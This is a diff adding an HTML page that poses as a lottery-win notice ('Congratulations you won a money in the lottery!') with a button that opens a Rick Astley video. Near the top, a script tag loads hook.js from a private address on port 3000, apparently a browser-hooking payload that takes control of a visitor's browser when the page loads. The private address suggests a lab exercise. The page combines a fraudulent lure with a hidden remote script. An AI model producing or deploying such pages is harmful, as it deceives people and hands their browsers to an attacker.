@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<script src="http://10.0.2.15:3000/hook.js"></script>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Rick Astley - Never Gonna Give You Up</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-image: url('https://htmlcolorcodes.com/assets/images/colors/black-color-solid-background-1920x1080.png');
+            background-size: cover; /* This property ensures that the background image covers the entire body */
+            background-position: center; /* This property centers the background image */
+            font-family: Arial, sans-serif; /* Default font family */
+            color: white; /* Text color */
+        }
+
+        .content {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+            z-index: 1; /* Ensure that content is in front of background */
+        }
+
+        h4 {
+            font-size: 18px; /* Example font size */
+            z-index: 1; /* Ensure that content is in front of background */
+        }
+
+        h1 {
+            font-size: 24px; /* Example font size */
+            z-index: 1; /* Ensure that content is in front of background */
+        }
+
+        button {
+            background-color: #4CAF50; /* Green */
+            border: none;
+            color: white;
+            padding: 15px 32px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            margin: 4px 2px;
+            cursor: pointer;
+            border-radius: 8px;
+            z-index: 1; /* Ensure that content is in front of background */
+        }
+    </style>
+</head>
+<body>
+    <div class="content">
+        <h4>Congratulations you won a money in the lottery!</h4>
+        <h1>Click the button to watch the video on how to claim.</h1>
+        <button onclick="openFullscreen()">Watch Video</button>
+    </div>
+
+    <script>
+        function openFullscreen() {
+            var url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+            window.open(url, "_blank");
+        }
+    </script>
+</body>
+</html>
